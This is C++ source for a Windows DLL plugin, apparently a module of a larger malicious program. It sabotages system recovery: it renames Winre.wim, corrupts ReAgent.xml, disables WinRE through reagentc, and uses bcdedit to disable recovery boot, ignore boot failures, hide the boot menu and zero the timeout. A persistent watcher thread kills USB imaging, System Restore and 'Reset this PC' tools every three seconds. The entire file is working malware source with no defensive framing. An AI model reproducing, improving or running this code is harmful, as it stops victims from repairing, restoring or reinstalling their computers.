#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>

static int _StrFind(const char* hay, DWORD hayLen, const char* needle){
    int nlen=0;while(needle[nlen])nlen++;
    if(nlen==0)return 0;
    for(DWORD i=0;i+(DWORD)nlen<=hayLen;i++){
        BOOL ok=TRUE;
        for(int j=0;j<nlen;j++)if(hay[i+j]!=needle[j]){ok=FALSE;break;}
        if(ok)return (int)i;
    }
    return -1;
}

static BOOL _PatchReAgentXml(void){
    wchar_t path[MAX_PATH]={};
    GetWindowsDirectoryW(path,MAX_PATH);
    lstrcatW(path,L"\\System32\\Recovery\\ReAgent.xml");

    HANDLE h=CreateFileW(path,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE)return FALSE;

    DWORD sz=GetFileSize(h,NULL);
    if(sz==0||sz>2*1024*1024){CloseHandle(h);return FALSE;}

    char* buf=(char*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sz+4);
    if(!buf){CloseHandle(h);return FALSE;}

    DWORD rd=0;
    BOOL ok=ReadFile(h,buf,sz,&rd,NULL);
    if(!ok||rd==0){HeapFree(GetProcessHeap(),0,buf);CloseHandle(h);return FALSE;}

    BOOL modified=FALSE;
    int pos;
    while((pos=_StrFind(buf,rd,"WinReEnabled=\"1\""))>=0){
        buf[pos+14]='0';modified=TRUE;
    }
    while((pos=_StrFind(buf,rd,"WinREEnabled=\"1\""))>=0){
        buf[pos+14]='0';modified=TRUE;
    }
    while((pos=_StrFind(buf,rd,"WinReEnabled=\"true\""))>=0){
        buf[pos+14]='f';buf[pos+15]='a';buf[pos+16]='l';buf[pos+17]='s';buf[pos+18]='e';
        modified=TRUE;
    }
    // Corrupt the WinreLocation path attribute so reagentc /enable can't locate Winre.wim.
    // ReAgent.xml uses volume-relative paths: path="\Recovery\WindowsRE"
    // Changing "\Recovery" to "\__xRec__" makes it unresolvable.
    while((pos=_StrFind(buf,rd,"\\Recovery\\WindowsRE"))>=0){
        buf[pos+1]='_';buf[pos+2]='_';buf[pos+3]='x';buf[pos+4]='R';
        buf[pos+5]='e';buf[pos+6]='c';buf[pos+7]='_';buf[pos+8]='_';
        modified=TRUE;
    }

    if(modified){
        SetFilePointer(h,0,NULL,FILE_BEGIN);
        SetEndOfFile(h);
        DWORD wr=0;
        WriteFile(h,buf,rd,&wr,NULL);
    }

    HeapFree(GetProcessHeap(),0,buf);
    CloseHandle(h);
    return modified;
}

// Rename Winre.wim so reagentc /enable can never find the WinRE image
static void _NukeWinreWim(void){
    // Common locations Windows stores Winre.wim
    wchar_t drives[]={L'C',L'D',L'E',L'F',L'G',0};
    for(int i=0;drives[i];i++){
        wchar_t path[MAX_PATH]={};
        path[0]=drives[i];path[1]=L':';
        lstrcatW(path,L"\\Recovery\\WindowsRE\\Winre.wim");
        if(GetFileAttributesW(path)!=INVALID_FILE_ATTRIBUTES){
            wchar_t dst[MAX_PATH]={};
            path[0]=drives[i];path[1]=L':';
            lstrcpyW(dst,path);
            // Replace .wim extension with .bak — breaks reagentc without deleting data
            DWORD dlen=(DWORD)lstrlenW(dst);
            if(dlen>3){dst[dlen-3]='b';dst[dlen-2]='a';dst[dlen-1]='k';}
            MoveFileW(path,dst);
        }
    }
    // Also try the System32 recovery path used on some OEM builds
    {
        wchar_t sysPath[MAX_PATH]={};
        GetWindowsDirectoryW(sysPath,MAX_PATH);
        lstrcatW(sysPath,L"\\System32\\Recovery\\Winre.wim");
        if(GetFileAttributesW(sysPath)!=INVALID_FILE_ATTRIBUTES){
            wchar_t dst[MAX_PATH]={};
            lstrcpyW(dst,sysPath);
            DWORD dlen=(DWORD)lstrlenW(dst);
            if(dlen>3){dst[dlen-3]='b';dst[dlen-2]='a';dst[dlen-1]='k';}
            MoveFileW(sysPath,dst);
        }
    }
}

// Run a system32 binary with given arguments, wait up to waitMs ms
static BOOL _RunSys32(const wchar_t* exe, const wchar_t* args, DWORD waitMs){
    wchar_t sys[MAX_PATH]={},cmd[MAX_PATH+256]={};
    GetSystemDirectoryW(sys,MAX_PATH);
    lstrcpyW(cmd,sys);lstrcatW(cmd,L"\\");lstrcatW(cmd,exe);
    lstrcatW(cmd,L" ");lstrcatW(cmd,args);
    STARTUPINFOW si={};PROCESS_INFORMATION pi={};si.cb=sizeof(si);
    BOOL r=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    if(r){WaitForSingleObject(pi.hProcess,waitMs);CloseHandle(pi.hProcess);CloseHandle(pi.hThread);}
    return r;
}

// Disable WinRE via reagentc
static void _RunReagentc(void){
    _RunSys32(L"reagentc.exe",L"/disable",10000);
}

// Disable recovery boot options via bcdedit
static void _DisableRecoveryBoot(void){
    _RunSys32(L"bcdedit.exe",L"/set {default} recoveryenabled No",8000);
    _RunSys32(L"bcdedit.exe",L"/set {default} bootstatuspolicy IgnoreAllFailures",8000);
    _RunSys32(L"bcdedit.exe",L"/set {bootmgr} displaybootmenu No",8000);
    _RunSys32(L"bcdedit.exe",L"/timeout 0",8000);
}

// Case-insensitive wchar_t comparison for process name matching
static BOOL _WNameEq(const wchar_t* a, const wchar_t* b){
    while(*a&&*b){
        wchar_t ca=*a,cb=*b;
        if(ca>='A'&&ca<='Z')ca+=32;
        if(cb>='A'&&cb<='Z')cb+=32;
        if(ca!=cb)return FALSE;
        a++;b++;
    }
    return *a==0&&*b==0;
}

// Kill all running processes whose name matches any entry in the list
static void _KillByNames(const wchar_t* const* names){
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(snap==INVALID_HANDLE_VALUE)return;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    if(Process32FirstW(snap,&pe)){
        do{
            for(int i=0;names[i];i++){
                if(_WNameEq(pe.szExeFile,names[i])){
                    HANDLE hp=OpenProcess(PROCESS_TERMINATE,FALSE,pe.th32ProcessID);
                    if(hp){TerminateProcess(hp,0);CloseHandle(hp);}
                    break;
                }
            }
        }while(Process32NextW(snap,&pe));
    }
    CloseHandle(snap);
}

static const wchar_t* const _UsbTools[]={
    // USB boot / disk imaging tools
    L"rufus.exe",
    L"balenaEtcher.exe",
    L"etcher.exe",
    L"etcherPro.exe",
    L"ultraiso.exe",
    L"imgburn.exe",
    L"unetbootin.exe",
    L"win32diskimager.exe",
    L"win32diskimager2.exe",
    L"linuxliveusb.exe",      // LiLi USB Creator
    L"wintoflash.exe",
    L"yumi.exe",              // YUMI Multiboot USB
    L"xboot.exe",
    L"sardu.exe",
    L"wubi.exe",
    L"usbwriter.exe",
    L"dd.exe",                // dd for Windows (raw disk write)
    L"HxD.exe",               // hex editor used for raw writes
    // Windows recovery / repair starters
    L"rstrui.exe",            // System Restore UI
    L"recoverydrive.exe",     // Windows Recovery Drive creator
    L"ResetEngine.exe",
    L"systemreset.exe",       // "Reset this PC"
    L"WindowsUpdateBox.exe",
    NULL
};

static DWORD WINAPI _WatcherThread(LPVOID){
    while(TRUE){
        _KillByNames(_UsbTools);
        Sleep(3000);
    }
    return 0;
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    // 1. Rename Winre.wim — without the image, reagentc /enable always fails
    _NukeWinreWim();

    // 2. Patch ReAgent.xml (disable flag + corrupt path)
    _PatchReAgentXml();

    // 3. Disable WinRE via reagentc
    _RunReagentc();

    // 4. Disable BCD recovery options
    _DisableRecoveryBoot();

    // 5. Kill any currently running USB/reset tools
    _KillByNames(_UsbTools);

    // 6. Persistent watcher — kills tools as they appear
    CreateThread(NULL,0,_WatcherThread,NULL,0,NULL);

    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){(void)h;(void)r;(void)l;return TRUE;}
